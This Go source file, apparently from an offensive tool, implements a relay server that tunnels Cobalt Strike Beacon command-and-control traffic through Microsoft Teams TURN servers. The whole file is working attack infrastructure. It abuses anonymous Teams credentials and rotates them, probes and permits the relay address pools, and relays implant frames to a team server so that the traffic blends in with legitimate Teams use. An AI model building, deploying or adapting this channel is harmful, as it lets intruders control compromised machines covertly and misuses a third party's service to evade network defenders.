// Package udc2 implements the UDC2 server: a TURN client that holds a
// long-lived relay allocation, accepts Beacon sessions arriving over TURN,
// and relays Beacon frames between them and a Cobalt Strike team server's
// UDC2 listener.
package udc2

import (
	"context"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"github.com/c0nf1den71al/turn-udc2/internal/proto"
	"github.com/c0nf1den71al/turn-udc2/internal/turnc"
)

// Config configures the UDC2 server.
type Config struct {
	// TurnServer is the hostname (and optionally ":port") of the TURN
	// server. Default: Microsoft Teams worldaz relay on 443.
	TurnServer string
	// TurnServerIP optionally pins the TURN server IP (SNI/cert
	// validation still uses the hostname). Pinning guarantees the
	// operator side and the Beacon side use the same TURN server, which
	// keeps both relay allocations in the same relay-address pool.
	TurnServerIP string
	// Username/Password are the TURN credentials.
	Username, Password string

	// CredRefresher, when set, is called periodically before the current
	// credentials expire to obtain fresh ones (anonymous Teams fetch by
	// default in cmd/turn-udc2-server). Rotation happens on the live
	// allocation: the relay address baked into Beacons never changes.
	CredRefresher func(ctx context.Context) (username, password string, expiresAt time.Time, err error)
	// InitialCredExpiry is when Username/Password expire (zero = unknown).
	InitialCredExpiry time.Time
	// CredCheckInterval is how often credentials are considered for
	// rotation (default 1h; smaller values are mainly useful for tests).
	CredCheckInterval time.Duration

	// TSAddr/TSPort are the team server's UDC2 listener.
	TSAddr string
	TSPort int

	// PermitCIDRs are additional IPv4 CIDRs whose addresses are
	// permitted on the relay so that first-contact packets from new
	// Beacons are delivered. Keep these small (/24 or narrower).
	PermitCIDRs []string
	// ProbePool allocates this many throwaway relays at startup and
	// permits the /24s of the observed addresses. Teams TURN servers
	// hand out relayed addresses from a multi-IP pool, so probing is
	// the reliable way to cover it. 0 disables.
	ProbePool int
	// PermitSelfSlash24 additionally permits the /24 containing the
	// server's own relayed IP. The default permission set (the relay's
	// own IP) covers the common case where a TURN server hands out
	// relayed addresses on a single IP.
	PermitSelfSlash24 bool

	// RootCAs optionally overrides TLS root CAs for the TURN connection
	// (nil = system roots; used by tests).
	RootCAs *x509.CertPool

	// ChunkSize is the payload size of each TURN message sent to Beacons.
	ChunkSize int

	// MaxFrameSize caps reassembled Beacon frames (default 4 MiB,
	// comfortably above the 1 MiB default tasks_max_size).
	MaxFrameSize int

	// Verbose enables chatty logging.
	Verbose bool

	// OnReady, when set, is called once the relay allocation exists and
	// initial permissions are installed. It receives the relayed address
	// Beacons must be configured with and the TURN server address the
	// server is connected to (pin it into the BOF so both sides use the
	// same TURN server and relay pool).
	OnReady func(relayAddr *net.UDPAddr, serverAddr net.Addr)
}

func (c *Config) defaults() error {
	if c.TurnServer == "" {
		c.TurnServer = "worldaz-msit.relay.teams.microsoft.com:443"
	}
	if c.TSAddr == "" || c.TSPort == 0 {
		return errors.New("udc2: team server address/port is required")
	}
	if c.ChunkSize <= 0 || c.ChunkSize > proto.MaxChunkPayload {
		c.ChunkSize = 1200
	}
	if c.MaxFrameSize <= 0 {
		c.MaxFrameSize = 4 << 20
	}
	if c.ProbePool < 0 || c.ProbePool > 64 {
		c.ProbePool = 0
	}
	if c.CredCheckInterval <= 0 {
		c.CredCheckInterval = time.Hour
	}
	return nil
}

// Server is a running UDC2 server.
type Server struct {
	cfg       Config
	log       *log.Logger
	tc        *turnc.Client
	relayAddr *net.UDPAddr

	mu        sync.Mutex
	permitSet map[string]struct{} // IP strings to keep permitted
	sessions  map[uint32]*session

	// Current TURN credentials (rotated via cfg.CredRefresher).
	credMu      sync.Mutex
	credUser    string
	credPass    string
	credExpires time.Time
}

// Run starts a UDC2 server and blocks serving until ctx is cancelled.
func Run(ctx context.Context, cfg Config, lg *log.Logger) error {
	if err := cfg.defaults(); err != nil {
		return err
	}
	if lg == nil {
		lg = log.Default()
	}

	s := &Server{
		cfg:         cfg,
		log:         lg,
		sessions:    make(map[uint32]*session),
		credUser:    cfg.Username,
		credPass:    cfg.Password,
		credExpires: cfg.InitialCredExpiry,
	}

	sni, portStr, err := net.SplitHostPort(cfg.TurnServer)
	if err != nil {
		return fmt.Errorf("udc2: bad turn server %q: %w", cfg.TurnServer, err)
	}
	port := 443
	if portStr != "" {
		if p, err := net.LookupPort("tcp", portStr); err != nil {
			return fmt.Errorf("udc2: bad turn server port: %w", err)
		} else {
			port = p
		}
	}
	connectHost := sni
	if cfg.TurnServerIP != "" {
		connectHost = cfg.TurnServerIP
	}

	lg.Printf("[*] connecting to TURN server %s (via %s) port %d", cfg.TurnServer, connectHost, port)
	tc, err := turnc.Dial(ctx, turnc.Options{
		Host:     sni,
		PinnedIP: cfg.TurnServerIP,
		Port:     port,
		Username: cfg.Username,
		Password: cfg.Password,
		RootCAs:  cfg.RootCAs,
	})
	if err != nil {
		return fmt.Errorf("udc2: %w", err)
	}
	defer tc.Close()
	s.tc = tc
	s.relayAddr = tc.RelayAddr()

	lg.Printf("[+] relay allocated: %s (TURN server %s)", s.relayAddr, tc.ServerAddr())

	// Build the initial permission set.
	s.permitSet = map[string]struct{}{s.relayAddr.IP.String(): {}}
	if cfg.PermitSelfSlash24 {
		addCIDR24(s.permitSet, s.relayAddr.IP)
	}
	for _, cidr := range cfg.PermitCIDRs {
		if _, ipnet, err := net.ParseCIDR(cidr); err != nil {
			lg.Printf("[-] ignoring bad permit cidr %q: %v", cidr, err)
		} else if ipnet.IP.To4() == nil || !isSlash24(ipnet) {
			lg.Printf("[-] ignoring non-/24 permit cidr %q (keep these small)", cidr)
		} else {
			addIPNet24(s.permitSet, ipnet)
		}
	}

	// Discover the relay address pool: allocate throwaway relays and
	// permit their /24s. Teams TURN servers hand out relayed addresses
	// from a multi-IP pool; a permission for only our own relay IP would
	// drop first-contact packets from new Beacons.
	if cfg.ProbePool > 0 {
		lg.Printf("[*] probing relay pool with %d allocations...", cfg.ProbePool)
		results := make(chan net.IP, cfg.ProbePool)
		var wg sync.WaitGroup
		for i := 0; i < cfg.ProbePool; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				c, err := turnc.Dial(ctx, turnc.Options{
					Host:     sni,
					PinnedIP: cfg.TurnServerIP,
					Port:     port,
					Username: cfg.Username,
					Password: cfg.Password,
				})
				if err != nil {
					return
				}
				defer c.Close()
				results <- c.RelayAddr().IP
			}()
		}
		wg.Wait()
		close(results)
		discovered := map[string]bool{}
		for ip := range results {
			if ip4 := ip.To4(); ip4 != nil {
				network := ip4.Mask(net.CIDRMask(24, 32))
				if !discovered[network.String()] {
					discovered[network.String()] = true
					lg.Printf("[*] relay pool /24 discovered: %s/24", network)
				}
				addCIDR24(s.permitSet, ip4)
			}
		}
	}

	if err := s.refreshPermissions(); err != nil {
		lg.Printf("[-] initial permission refresh failed: %v", err)
	}

	// Maintenance: keep the allocation and permissions alive with the
	// current credentials (pion's internal refreshers keep using the
	// startup credentials, so once those expire this loop is what keeps
	// the relay alive), and rotate credentials before they expire.
	go s.maintenance(ctx)

	go func() {
		<-ctx.Done()
		tc.Close()
	}()

	if cfg.OnReady != nil {
		cfg.OnReady(s.relayAddr, tc.ServerAddr())
	}

	lg.Printf("[*] udc2 server relaying %s <-> %s:%d; waiting for Beacons",
		s.relayAddr, cfg.TSAddr, cfg.TSPort)

	buf := make([]byte, 64<<10)
	for {
		n, peer, err := tc.ReadFrom(buf)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			return fmt.Errorf("udc2: relay read: %w", err)
		}
		chunk, err := proto.ParseChunk(buf[:n])
		if err != nil {
			if cfg.Verbose {
				lg.Printf("[-] bad chunk from %s: %v", peer, err)
			}
			continue
		}
		s.sessionFor(chunk.SessionID, peer).push(chunk)
	}
}

// RelayAddr returns the relayed transport address Beacons are configured
// with. Valid after Run has allocated.
func (s *Server) RelayAddr() *net.UDPAddr { return s.relayAddr }

func isSlash24(ipnet *net.IPNet) bool {
	ones, bits := ipnet.Mask.Size()
	return ones == 24 && bits == 32
}

func addCIDR24(set map[string]struct{}, ip net.IP) {
	network := ip.To4().Mask(net.CIDRMask(24, 32))
	addIPNet24(set, &net.IPNet{IP: network, Mask: net.CIDRMask(24, 32)})
}

func addIPNet24(set map[string]struct{}, ipnet *net.IPNet) {
	cur := append(net.IP{}, ipnet.IP.To4()...)
	for i := 0; i < 256; i++ {
		if !ipnet.Contains(cur) {
			return
		}
		set[cur.String()] = struct{}{}
		incrementIP(cur)
	}
}

func incrementIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] != 0 {
			break
		}
	}
}

// refreshPermissions re-creates permissions for the wide permit set and
// every active session peer, using the current (possibly rotated)
// credentials.
func (s *Server) refreshPermissions() error {
	ips := make([]net.IP, 0, len(s.permitSet)+len(s.sessions))
	s.mu.Lock()
	for ipStr := range s.permitSet {
		if ip := net.ParseIP(ipStr); ip != nil {
			ips = append(ips, ip)
		}
	}
	for _, sess := range s.sessions {
		ips = append(ips, sess.peerIP())
	}
	s.mu.Unlock()

	user, pass := s.currentCreds()
	return s.tc.PermitWithCreds(user, pass, ips...)
}

// currentCreds returns the current TURN credentials.
func (s *Server) currentCreds() (string, string) {
	s.credMu.Lock()
	defer s.credMu.Unlock()
	return s.credUser, s.credPass
}

// refreshAllocation extends the relay allocation with the current
// credentials.
func (s *Server) refreshAllocation() error {
	user, pass := s.currentCreds()
	return s.tc.RefreshAllocationWithCreds(user, pass)
}

// credLeadTime is how long before expiry credentials are rotated. The
// observed Teams credential lifetime is 7 days, so 48h leaves plenty of
// slack for a stalled refetch.
const credLeadTime = 48 * time.Hour

// maintenance keeps the relay alive and the credentials fresh.
func (s *Server) maintenance(ctx context.Context) {
	permT := time.NewTicker(4 * time.Minute) // permissions live 300s
	credT := time.NewTicker(s.cfg.CredCheckInterval)
	defer permT.Stop()
	defer credT.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-permT.C:
			if err := s.refreshAllocation(); err != nil {
				s.log.Printf("[-] allocation refresh failed: %v", err)
			}
			if err := s.refreshPermissions(); err != nil {
				s.log.Printf("[-] permission refresh failed: %v", err)
			}
		case <-credT.C:
			s.rotateCreds(ctx)
		}
	}
}

// rotateCreds fetches fresh credentials via cfg.CredRefresher and swaps
// them in. Rotation happens on the live allocation (Teams TURN accepts
// any currently-valid credential pair), so the relay address baked into
// Beacons stays valid. The new credentials are validated with a REFRESH
// before being adopted; on failure the old ones are kept and the next
// tick retries.
func (s *Server) rotateCreds(ctx context.Context) {
	if s.cfg.CredRefresher == nil {
		return
	}
	s.credMu.Lock()
	expires := s.credExpires
	s.credMu.Unlock()
	if !expires.IsZero() && time.Until(expires) > credLeadTime {
		return
	}

	user, pass, expiresAt, err := s.cfg.CredRefresher(ctx)
	if err != nil {
		s.log.Printf("[-] credential rotation: fetch failed: %v", err)
		return
	}
	if user == "" || pass == "" {
		s.log.Printf("[-] credential rotation: refresher returned empty credentials")
		return
	}

	if err := s.tc.RefreshAllocationWithCreds(user, pass); err != nil {
		s.log.Printf("[-] credential rotation rejected by TURN server: %v (keeping current credentials)", err)
		return
	}
	s.credMu.Lock()
	s.credUser, s.credPass, s.credExpires = user, pass, expiresAt
	s.credMu.Unlock()

	if err := s.refreshPermissions(); err != nil {
		s.log.Printf("[-] permission refresh after credential rotation failed: %v", err)
	}
	if expiresAt.IsZero() {
		s.log.Printf("[+] TURN credentials rotated (expiry unknown)")
	} else {
		s.log.Printf("[+] TURN credentials rotated; next rotation by %s", expiresAt.Add(-credLeadTime).Format(time.RFC3339))
	}
}

// permitPeer installs a permission for one Beacon peer IP ahead of the
// 4-minute maintenance pass (called async so the relay read loop never
// blocks on a TURN transaction).
func (s *Server) permitPeer(ip net.IP) {
	user, pass := s.currentCreds()
	if err := s.tc.PermitWithCreds(user, pass, ip); err != nil {
		s.log.Printf("[-] permit %s: %v", ip, err)
	}
}

// sessionFor returns (creating if needed) the session for a Beacon. New
// sessions dial the team server from their own goroutine.
func (s *Server) sessionFor(id uint32, peer *net.UDPAddr) *session {
	s.mu.Lock()
	defer s.mu.Unlock()
	if sess, ok := s.sessions[id]; ok {
		sess.updatePeer(peer)
		return sess
	}

	sess := &session{
		id:   id,
		srv:  s,
		asm:  proto.NewAssembler(s.cfg.MaxFrameSize),
		peer: peer,
		ch:   make(chan proto.Chunk, 512),
		done: make(chan struct{}),
	}
	s.sessions[id] = sess
	go sess.run()
	// First contact from this relay IP: permit it now rather than waiting
	// for the maintenance pass.
	go s.permitPeer(peer.IP)
	return sess
}

func (s *Server) dropSession(id uint32) {
	s.mu.Lock()
	sess, ok := s.sessions[id]
	if ok {
		delete(s.sessions, id)
	}
	s.mu.Unlock()
	if ok {
		sess.stop()
	}
}

// session is one Beacon session: reassembles its chunks and relays
// complete Beacon frames to/from a dedicated team server connection.
type session struct {
	id  uint32
	srv *Server
	asm *proto.Assembler

	mu       sync.Mutex
	peer     *net.UDPAddr
	ts       net.Conn
	ch       chan proto.Chunk
	done     chan struct{}
	stopOnce sync.Once

	// retransmission state for the last response sent to the Beacon
	respMu     sync.Mutex
	respSeq    uint8
	respChunks [][]byte
}

// resendDelay is how long the session waits for missing inbound
// fragments before asking the Beacon to RESEND them (the relayed hop is
// lossy UDP).
const resendDelay = 600 * time.Millisecond

// run owns the session: it dials the team server, sends the initial
// "go" frame, then processes chunks serially.
func (s *session) run() {
	defer s.srv.dropSession(s.id)

	d := net.Dialer{Timeout: 30 * time.Second}
	conn, err := d.Dial("tcp", net.JoinHostPort(s.srv.cfg.TSAddr, fmt.Sprint(s.srv.cfg.TSPort)))
	if err != nil {
		s.srv.log.Printf("[-] session %08x: team server dial: %v", s.id, err)
		return
	}
	// The UDC2 protocol requires an initial "go" frame (4-byte LE length
	// followed by "go") before relaying frames.
	goFrame := make([]byte, 6)
	binary.LittleEndian.PutUint32(goFrame, 2)
	copy(goFrame[4:], "go")
	if _, err := conn.Write(goFrame); err != nil {
		conn.Close()
		s.srv.log.Printf("[-] session %08x: team server go frame: %v", s.id, err)
		return
	}

	s.mu.Lock()
	s.ts = conn
	s.mu.Unlock()

	s.srv.log.Printf("[+] session %08x registered from relay %s", s.id, s.peer)

	resendTick := time.NewTimer(time.Hour)
	defer resendTick.Stop()
	for {
		select {
		case chunk := <-s.ch:
			resendTick.Stop()
			if !s.handle(chunk) {
				return
			}
			if s.asm.Active() {
				resendTick.Reset(resendDelay)
			}
		case <-resendTick.C:
			// Inbound frame stalled with gaps: ask for retransmission.
			if missing := s.asm.Missing(64); len(missing) > 0 {
				s.srv.log.Printf("[*] session %08x: requesting resend of %d fragments", s.id, len(missing))
				s.sendToPeer(proto.BuildResend(s.id, s.asm.MsgSeq(), missing))
				resendTick.Reset(resendDelay)
			}
		case <-s.done:
			return
		}
	}
}

// sendToPeer writes one encoded chunk to the Beacon's relay as a raw
// Send indication: no client-side permission bookkeeping, so it keeps
// working no matter which credentials are current (permissions are
// maintained server-side by the maintenance pass and permitPeer).
func (s *session) sendToPeer(encoded []byte) bool {
	s.mu.Lock()
	peer := s.peer
	s.mu.Unlock()
	if err := s.srv.tc.SendIndication(peer, encoded); err != nil {
		s.srv.log.Printf("[-] session %08x: relay write: %v", s.id, err)
		return false
	}
	return true
}

// push queues a chunk for the session; never blocks the relay read loop.
func (s *session) push(chunk proto.Chunk) {
	select {
	case s.ch <- chunk:
	case <-s.done:
	default:
		s.srv.log.Printf("[-] session %08x: inbound queue full; dropping chunk", s.id)
	}
}

// handle processes one chunk; returns false when the session ended.
func (s *session) handle(chunk proto.Chunk) bool {
	switch chunk.Type {
	case proto.TypeResend:
		return s.handleResend(chunk)
	case proto.TypeData:
		// fall through to the reassembly path
	default:
		return true
	}

	msg, complete, err := s.asm.Push(chunk)
	if err != nil {
		s.srv.log.Printf("[-] session %08x: %v", s.id, err)
		return true
	}
	if !complete {
		return true
	}

	s.mu.Lock()
	ts := s.ts
	s.mu.Unlock()
	if ts == nil {
		return true
	}

	if s.srv.cfg.Verbose {
		s.srv.log.Printf("[*] session %08x: frame out (%d bytes)", s.id, len(msg))
	}
	if _, err := ts.Write(msg); err != nil {
		s.srv.log.Printf("[-] session %08x: team server write: %v", s.id, err)
		return false
	}

	frame, err := readFrame(ts)
	if err != nil {
		s.srv.log.Printf("[-] session %08x: team server read: %v", s.id, err)
		return false
	}
	if s.srv.cfg.Verbose {
		s.srv.log.Printf("[*] session %08x: frame in (%d bytes)", s.id, len(frame))
	}

	// Send the response as fragments and keep them around so the Beacon
	// can ask us to RESEND any that are lost on the lossy relayed hop.
	s.respMu.Lock()
	s.respSeq++
	chunks := proto.SplitMessage(s.id, s.respSeq, frame, s.srv.cfg.ChunkSize)
	s.respChunks = chunks
	s.respMu.Unlock()
	for _, encoded := range chunks {
		if !s.sendToPeer(encoded) {
			return false
		}
	}
	return true
}

// handleResend retransmits response fragments the Beacon is missing.
func (s *session) handleResend(chunk proto.Chunk) bool {
	indices, err := proto.IndicesFromResend(chunk)
	if err != nil {
		s.srv.log.Printf("[-] session %08x: %v", s.id, err)
		return true
	}
	s.respMu.Lock()
	seq, chunks := s.respSeq, s.respChunks
	s.respMu.Unlock()
	if chunk.MsgSeq != seq || chunks == nil {
		return true // stale request
	}
	for _, idx := range indices {
		if int(idx) >= len(chunks) {
			continue
		}
		if !s.sendToPeer(chunks[idx]) {
			return false
		}
	}
	if s.srv.cfg.Verbose {
		s.srv.log.Printf("[*] session %08x: resent %d fragments", s.id, len(indices))
	}
	return true
}

func (s *session) updatePeer(peer *net.UDPAddr) {
	s.mu.Lock()
	changed := s.peer == nil || !s.peer.IP.Equal(peer.IP) || s.peer.Port != peer.Port
	if changed {
		// Beacon re-allocated its relay; session survives on the same
		// team server connection.
		s.peer = peer
	}
	s.mu.Unlock()
	if changed {
		go s.srv.permitPeer(peer.IP)
	}
}

func (s *session) peerIP() net.IP {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.peer.IP
}

func (s *session) stop() {
	s.stopOnce.Do(func() {
		close(s.done)
		s.mu.Lock()
		ts := s.ts
		s.mu.Unlock()
		if ts != nil {
			ts.Close()
		}
	})
}

// readFrame reads one length-prefixed frame from the team server and
// returns it including its 4-byte little-endian length prefix (exactly
// what the BOF must place in recvBuf).
func readFrame(conn net.Conn) ([]byte, error) {
	var lenBuf [4]byte
	if _, err := io.ReadFull(conn, lenBuf[:]); err != nil {
		return nil, err
	}
	length := binary.LittleEndian.Uint32(lenBuf[:])
	if length > 16<<20 {
		return nil, fmt.Errorf("frame length %d too large", length)
	}
	frame := make([]byte, 4+length)
	copy(frame, lenBuf[:])
	if _, err := io.ReadFull(conn, frame[4:]); err != nil {
		return nil, err
	}
	return frame, nil
}
